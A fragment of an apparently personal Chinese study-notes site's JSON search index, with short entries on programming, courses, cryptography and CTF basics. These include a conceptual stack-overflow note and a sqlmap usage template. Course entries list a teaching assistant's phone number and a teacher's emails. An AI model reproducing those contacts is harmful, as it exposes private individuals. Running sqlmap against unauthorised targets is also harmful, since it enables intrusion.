"},{"id":438,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/","title":"4.Block-Hash-MAC","section":"算法和协议中的安全机制","content":"Chapter 4. Design of Block Ciphers, Hash Functions, and MAC #  "},{"id":439,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/4.viewlayer/","title":"4.ViewLayer","section":"MiniProgram","content":"视图层 #  框架的视图层由 WXML 与 WXSS 编写，由组件来进行展示。\n将逻辑层的数据反应成视图，同时将视图层的事件发送给逻辑层。\nWXML(WeiXin Markup language) 用于描述页面的结构。\nWXS(WeiXin Script) 是小程序的一套脚本语言，结合 WXML，可以构建出页面的结构。\nWXSS(WeiXin Style Sheet) 用于描述页面的样式。\n组件(Component)是视图的基本组成单元。\n"},{"id":440,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/","title":"4.传输层","section":"计算机网络","content":"4.传输层 #  "},{"id":441,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/","title":"5.应用层","section":"计算机网络","content":"5.应用层 #  "},{"id":442,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-wiki/7.1.stackoverflow/","title":"7.1.StackOverflow","section":"ctf-wiki","content":"7.1.StackOverflow #  对于程序的栈区，以下几点需要注意：\n 程序的栈是从高地址向低地址增长的 x86 的函数参数在函数返回地址的上面；x64 程序的前六个整型或指针型参数依次保存在 RDI、RSI、RDX、RCX、R8、R9 六个寄存器中（Linux、FreeFSD、macOS 采用），更多参数则会保存在栈上。 x64 的地址长度不能超过 0x0000 7FFF FFFF FFFF 六个字节长度，否则会抛出异常。  发生栈溢出的原理是：\n 向程序中写入的字节数，超过了这个变量本身所申请的字节数，导致写入非法的位置。  这种缓冲区溢出漏洞除了发生在栈上，也以同样的原理发生在了堆、bss 等上。\n可见发生栈溢出或任何其他段的溢出的基本前提是：\n 程序必须向内存中写入数据 写入数据的大小没有被良好地控制  "},{"id":443,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-wiki/7.3.glibcheap/","title":"7.3.GlibcHeap","section":"ctf-wiki","content":"7.3.GlibcHeap #  先了解 glibc 的堆结构与实现流程：glibc 堆\n"},{"id":444,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/android/","title":"Android","section":"JAVA","content":"Android #  "},{"id":445,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/android/","title":"android","section":"工具","content":"android #  "},{"id":446,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/","title":"Android逆向分析","section":"安全技术","content":" 学习途径\n 丰生强著 《Android 软件安全与逆向分析》   README #  "},{"id":447,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/cocoapods/","title":"CocoaPods","section":"iOS","content":"CocoaPods #  官方网站：https://cocoapods.org/\n"},{"id":448,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/codeacademy/","title":"codeacademy","section":"JAVA","content":" 学习途径：\n codeacademy JAVA 课程   JAVA #  "},{"id":449,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/","title":"CommandSet","section":"Linux","content":"CommandSet #  "},{"id":450,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/cpp/","title":"Cplusplus","section":"软件技术","content":"C++ #  佘崧林在写博客之前已经对 C++ 比较了解，这里主要记录一些 C++ 的新特性。\n"},{"id":451,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/csapp/","title":"CSAPP","section":"理论课程","content":"Computer Systems A Programmer\u0026rsquo;s Perspective #  "},{"id":452,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/csharp/","title":"CSharp","section":"软件技术","content":"C# #  "},{"id":453,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-wiki/","title":"ctf-wiki","section":"安全技术","content":"CTFWiki #  "},{"id":454,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/ctf-wiki/","title":"ctf-wiki","section":"题目","content":"ctf-wiki #  ctf-wki 上收录的示例题目。\n"},{"id":455,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/database/","title":"Database","section":"软件技术","content":"���ݿ� #  "},{"id":456,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/","title":"DesignPatterns","section":"SystemDesign","content":" 参考资料：\n 来源：《Design Patterns - Elements of Reusable Object-Oriented Software》 菜鸟教程：https://www.runoob.com/design-pattern/factory-pattern.html   设计模式 #  类型 #  根据设计模式的参考书 中所提到的，总共有 23 种设计模式。\n这些模式可以分为三大类：创建型模式（Creational Patterns）、结构型模式（Structural Patterns）、行为型模式（Behavioral Patterns）。当然，我们还会讨论另一类设计模式：J2EE 设计模式。\n   模式分类 描述     创建型模式 这些设计模式提供了一种在创建对象的同时隐藏创建逻辑的方式。\n这使得程序在判断针对某个给定实例需要创建哪些对象时更加灵活。   结构型模式 这些设计模式关注类和对象的组合。\n继承的概念被用来组合接口和定义组合对象获得新功能的方式。   行为型模式 这些设计模式特别关注对象之间的通信。   J2EE 模式 这些设计模式特别关注表示层。这些模式是由 Sun Java Center 鉴定的。    原则 #  设计模式的六大原则：\n 开闭原则（Open Close Principle）：对扩展开放、对修改关闭。  在程序需要扩展功能时，可以实现 hot-plugins； 程序实现扩展时，不能对既有的代码进行修改；   里氏代换原则（Liskov Substitution Principle）：任何基类可以出现的地方，子类一定可以出现。 依赖倒转原则（Dependence Inversion Principle）：针对接口编程，依赖于抽象而不依赖于具体。 接口隔离原则（Interface Segregation Principle）：使用多个隔离的接口，比使用单个接口好。也可以说是降低类之间的耦合度； 迪米特法则，或最少知道原则（Demeter Principle）：一个实体应当尽量少地于其他实体之间发生相互作用，使得系统功能模块相对独立； 合成复用原则（Composite Reuse Principle）：尽量使用合成的方式而不是继承。  "},{"id":457,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/","title":"Django","section":"Python","content":"README #  学习 Python Django WEB 框架的学习笔记。\n"},{"id":458,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/docker/","title":"Docker","section":"软件技术","content":"Docker #  学习网址来自官网 Document：\n https://docs.docker.com/get-started/  "},{"id":459,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/golang/draveness/","title":"Draveness","section":"Golang","content":" Golang：\n https://draveness.me/golang/   README #   我们在工业界需要这么一门语法简单的编译型语言，它能够提供简单的抽象和概念，虽然目前 Go 语言也有很多问题，但是语言以及周边工具的不断完善也让作者感受到了社区的活力，也坚定地认为这门语言未来的发展会越来愈好。\n 在互联网上找的一个相当出色的学习教材，这个教材通过编译产物分析与内存分析对 Go 有详细的了解。\n"},{"id":460,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/flask/","title":"Flask","section":"Python","content":"Flask #  "},{"id":461,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/functional/","title":"functional","section":"JavaScript","content":"函数式编程 #  参考资料：\n 原文：https://github.com/MostlyAdequate/mostly-adequate-guide 译文：https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/ch1.html  "},{"id":462,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/gdb/","title":"gdb","section":"工具","content":"gdb #  "},{"id":463,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/","title":"HOMEWORK","section":"信息安全数学基础","content":"HOMEWORK #  "},{"id":464,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/","title":"HOMEWORK","section":"操作系统","content":"HOMEWORK #  "},{"id":465,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/html5/","title":"html5","section":"JavaScript","content":"html5 #  "},{"id":466,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/","title":"iOS","section":"软件技术","content":" 参考资料：\n Objective-C 官方文档：https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/ObjectiveC/Introduction/introObjectiveC.html 苹果 API：https://developer.apple.com/documentation/ 菜鸟教程简单介绍：https://www.runoob.com/w3cnote/objective-c-tutorial.html   Objective-C #  面试题目资料：\n https://www.jianshu.com/p/ba64e98b8e59 https://www.jianshu.com/p/89978870f49f https://www.jianshu.com/p/e87e0be2281f  "},{"id":467,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/","title":"iOS逆向分析","section":"安全技术","content":" 学习途径：\n 刘培庆：《iOS 应用逆向与安全》   README #  "},{"id":468,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/","title":"JAVA","section":"软件技术","content":"JAVA #  "},{"id":469,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/","title":"JavaScript","section":"软件技术","content":"HTML-CSS #  "},{"id":470,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/kali/","title":"kali","section":"工具","content":"kali #  "},{"id":471,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/","title":"lab1","section":"HOMEWORK","content":"lab1 #  "},{"id":472,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab2/","title":"lab2","section":"HOMEWORK","content":"lab2 #  "},{"id":473,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/","title":"lab3","section":"HOMEWORK","content":"lab3 #  "},{"id":474,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab4/","title":"lab4","section":"HOMEWORK","content":"lab4 #  "},{"id":475,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/","title":"LinuxAudit","section":"安全技术","content":"LinuxAudit #  "},{"id":476,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/macos/","title":"MacOS","section":"软件技术","content":"README #  论如何高效地使用 Mac OS X。\n"},{"id":477,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/","title":"MiniProgram","section":"软件技术","content":" 学习地址：\n https://developers.weixin.qq.com/miniprogram/dev/   微信小程序开发 #  在腾讯的提供的官网上学习微信小程序开发。\nFrameWork #   学习地址：\n https://developers.weixin.qq.com/miniprogram/dev/framework/MINA.html 基本上就是抄过来的   "},{"id":478,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/database/mongodb/","title":"MongoDB","section":"Database","content":"MongoDB #  MoongoDB 虽然开源，但是代码复杂。有关 MongoDB 只需要粗略了解即可。\n"},{"id":479,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/nmap/","title":"nmap","section":"工具","content":"nmap #  "},{"id":480,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/","title":"nodejs","section":"JavaScript","content":" W3school 学习：\n https://www.w3schools.com/nodejs/  菜鸟教程：\n https://www.runoob.com/nodejs/nodejs-tutorial.html   README #  什么是 node.js?\n 免费的、跨平台的、以 javascript 作为语言的开源服务器环境。  node.js 可以做什么？\n 生成一个动态的前端页面； 可以操作服务器上的文件系统、数据库； 可以接受处理表单信息。  "},{"id":481,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/","title":"Objective-C\u0026SDK","section":"iOS","content":"基础知识 #  Objective-C 的入口函数是 main.m 文件中的 main 函数，它的传入参数与 C 中也是类似的。\n比如一个 HelloWorld 程序应该通过以下的方式编写：\n#import \u0026lt;UIKit/UIKit.h\u0026gt;  int main(int argc, char * argv[]) { NSLog(@\u0026#34;Hello World!\u0026#34;); return 0; } "},{"id":482,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/php/","title":"PHP","section":"软件技术","content":"PHP #  "},{"id":483,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/pwnable/","title":"pwnable","section":"题目","content":"pwnable #  "},{"id":484,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/pwntools/","title":"pwntools","section":"工具","content":"PwnTools #  "},{"id":485,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/","title":"Python","section":"软件技术","content":"Python #  有关 python 基础知识和一些库的使用。\n"},{"id":486,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/reactjs/","title":"reactjs","section":"JavaScript","content":"README #   学习路径：ByteDance 技术学院\n "},{"id":487,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/database/redis/","title":"Redis","section":"Database","content":"Redis #  读书笔记：《Redis 设计与实现（第二版）》\n源代码地址：https://github.com/redis/redis.git\n"},{"id":488,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/runtime/","title":"Runtime","section":"iOS","content":"Runtime #  iOS 运行时源码下载：\n$ git clone git@github.com:opensource-apple/objc4.git "},{"id":489,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/swiftsdk/","title":"Swift\u0026SDK","section":"iOS","content":"README #   菜鸟教程：\n https://www.runoob.com/swift/swift-tutorial.html   xcode 提供了 playground 功能学习 swift 的基础语法。\n若要创建 OS X 的 playground，需要使用引入 Cocoa：\nimport Cocoa 若要创建 iOS 的 playground，则需要引入 UIKit：\nimport UIKit 输入输出可以用：\nprint(\u0026#34;Hello World\u0026#34;) let world = readLine() "},{"id":490,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/","title":"SystemDesign","section":"软件技术","content":"README #  "},{"id":491,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/rust/thebook/","title":"TheBook","section":"Rust","content":"The Rust Programming Language #   https://doc.rust-lang.org/book/index.html\n "},{"id":492,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/tutorial/","title":"Tutorial","section":"Django","content":"Tutorial #  "},{"id":493,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/flask/tutorial/","title":"Tutorial","section":"Flask","content":" 学习网址：\n http://flask.pocoo.org/docs/1.0/tutorial/   Tutorial #  tutorial 项目的网址：https://github.com/pallets/flask/tree/1.0.2/examples/tutorial\n"},{"id":494,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/typescript/","title":"typescript","section":"JavaScript","content":" 官方：\n https://www.tslang.cn/docs/handbook/typescript-in-5-minutes.html   TypeScript #  TypeScript 是 JavaScript 的一个超集，支持 ECMAScript 6 标准。\n如果你的本地环境已经安装了 npm 工具，可以使用以下命令来安装：\nnpm install -g typescript 编译选项见文档：\n https://www.tslang.cn/docs/handbook/compiler-options.html https://www.typescriptlang.org/docs/handbook/compiler-options.html  "},{"id":495,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/unity/","title":"Unity","section":"软件技术","content":"README #  byr 学习资源 #     资源名称 授课来源 评价 笔记     Unity 游戏开发之程序语言入门篇 刘国柱老师 全是废话    Unity3D特效系统之基础篇 MOOC（imooc） 讲得挺好，找到了源地址           "},{"id":496,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/versioncontrol/","title":"VersionControl","section":"软件技术","content":"GitAndSvn #  "},{"id":497,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/vim/","title":"Vim","section":"软件技术","content":"Vim #  "},{"id":498,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/vmware/","title":"vmware","section":"工具","content":"vmware #  "},{"id":499,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/vuejs/","title":"vuejs","section":"JavaScript","content":"README #  前端学习笔记：学习 Vue 框架。\n 学习网址：https://cn.vuejs.org/v2/guide/index.html#\n "},{"id":500,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/","title":"xman3","section":"安全技术","content":"README #  2018 年夏季，8.1-8.18 在南开举办的第三届 XMAN 信息安全夏令营学习笔记。\n"},{"id":501,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/","title":"信息安全数学基础","section":"理论课程","content":" 学习途径：\n 2019 年上半学年，贾春福老师《信息安全数学基础》   信息安全数学基础 #  "},{"id":502,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/","title":"公钥密码体制","section":"密码学","content":"公钥密码体制总结 #     密码体制 安全性基于的难题     背包密码体制 背包难题   RSA 大整数分解问题   Rabin密码体制（RSA 的一种） 大整数分解问题   Williams 密码体制（对 Rabin 的改进） 大整数分解问题   Diffe-Hellman 密钥交换协议 离散对数问题   ElGamal 密码 有限域上离散对数问题   ECC 椭圆曲线上的离散对数问题   Regev 加密 格困难问题   NTRU 格中最短向量问题   McEliece 密码 纠错编码理论   Shamir-(t,n) 门限方案 Lagrange内插多项式   Feistel加密 代换和置换   Asmuth\u0026amp;Bloom-(t,n) 门限 中国剩余定理   MI 方案 多变量问题    "},{"id":503,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/","title":"分布式系统","section":"理论课程","content":" 参考资料 MIT 6.824：https://pdos.csail.mit.edu/6.824/\n其他资料：\n http://learn.lianglianglee.com/%E4%B8%93%E6%A0%8F/24%E8%AE%B2%E5%90%83%E9%80%8F%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%AE%8C   分布式系统 #  "},{"id":504,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/","title":"分组密码体制","section":"密码学","content":"分组密码体制 #  分组密码算法工作模式（block cipher operation mode）：\n 电码本工作模式（ECB）； 密码分组链接工作模式（CBC）； 密码反馈工作模式（CFB）； 输出反馈工作模式（OFB）； 计数器工作模式（CTR）等。  "},{"id":505,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/","title":"国密算法","section":"密码学","content":"国密算法 #  四种加密算法（github 实现）：\n SM1：对称加密算法，加密强度 128 位（加密流程保密）； SM2：基于 ECC 的 256 位非对称加密算法； SM3：256 位的消息摘要算法； SM4：128 位的分组对称加密算法。  "},{"id":506,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/","title":"实验项目组成","section":"操作系统","content":"实验项目组成 #  "},{"id":507,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/","title":"密码学","section":"理论课程","content":"密码学 #  这里只有上课的作业。理论部分详见：密码学\n"},{"id":508,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/","title":"工具","section":"安全技术","content":"工具 #  关于各种工具的用途总结：\nWEB 工具 #  shodan：\n# 安装 $ pip install shodan # 初始化 $ shodan init \u0026lt;API KEY\u0026gt; # 详细见：https://cli.shodan.io/ sqlmap：\n# 安装 $ pip install sqlmap # 使用 $ sqlmap -u \u0026lt;target website\u0026gt; 密码学工具 #  z3，pycrypto，sagemath\nPE Portable Executable #    VirusTotal：一个分析病毒文件的在线网站。\n  pefile：一个静态分析 PE 文件的 python 库。源代码\n  capstone、keystone-enginne：一个处理反汇编程序的库和一个处理汇编程序的库，可以使用 python、c++ 等语言编写。源代码\n  "},{"id":509,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","title":"性能优化","section":"iOS","content":"性能优化 #  "},{"id":510,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/","title":"恶意代码分析","section":"理论课程","content":" 学习途径：\n 2019 年上半学年王志《恶意代码分析》   恶意代码分析 #  恶意代码分析的上机课实验作业\n"},{"id":511,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"操作系统","section":"理论课程","content":"操作系统 #  参考书籍：《现代操作系统》\n"},{"id":512,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/","title":"数字逻辑","section":"理论课程","content":"README #  2018-2019 学年第一学期数字逻辑课堂笔记。\n 授课老师：程仁洪\n助教：邱雨，18526649330\n "},{"id":513,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/","title":"数据库系统原理","section":"理论课程","content":"数据库系统原理 #  "},{"id":514,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","title":"数据结构","section":"理论课程","content":"README #  这是通过 Data Structres and Program Design in C++ 这本书学习数据结构的笔记。\n"},{"id":515,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/","title":"机器学习快速入门教程","section":"算法统计","content":" 学习网址：\n https://developers.google.cn/machine-learning/crash-course/ml-intro   Introduction to machine learning.\n"},{"id":516,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/","title":"概率论","section":"理论课程","content":"概率论 #  "},{"id":517,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%B0%91%E6%B3%95%E6%80%BB%E8%AE%BA/","title":"民法总论","section":"理论课程","content":"民法总论 #  "},{"id":518,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/","title":"白帽子讲WEB安全","section":"安全技术","content":"白帽子讲WEB安全 #  "},{"id":519,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/","title":"算法和协议中的安全机制","section":"理论课程","content":" 学习途径：\n 2019 年上班学年苏明老师《算法和协议中的安全机制》   算法和协议中的安全机制 #  "},{"id":520,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/","title":"算法竞赛入门经典","section":"算法统计","content":"README #  阅读 《算法竞赛入门经典》 一书的读书笔记。\n"},{"id":521,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BB%8F%E6%B5%8E%E6%B3%95/","title":"经济法","section":"理论课程","content":"经济法 #  "},{"id":522,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/","title":"编译原理","section":"理论课程","content":"README #  2018-2019学年第一学期，编译原理课程学习课堂笔记。\n 授课老师：李忠伟。\n老师办公地点：计控楼409。\n邮箱：mwgzwp@nbjl.nankai.edu.cn; lizhongwei@nbjl.nankai.edu.cn\n 编译原理课程的重点是 词法分析 和 语法分析。\n"},{"id":523,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/","title":"网络基本功","section":"计算机网络","content":"网络基本功博客 #  "},{"id":524,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/","title":"菜鸟基础教程","section":"JAVA","content":" 学习路径：\n http://www.runoob.com/java/java-tutorial.html   菜鸟基础教程 #  "},{"id":525,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","title":"菜鸟面向对象","section":"JAVA","content":"菜鸟面向对象 #  "},{"id":526,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","title":"计算机网络","section":"理论课程","content":"README #  2018-2019 学年第一学期计算机网络课堂笔记。\n 授课老师：张建忠、徐敬东\n "},{"id":527,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/","title":"题目","section":"安全技术","content":"题目 #  "},{"id":528,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/","title":"高效能团队模式","section":"项目管理","content":" 《高效能团队模式》读书笔记\n README #  "}]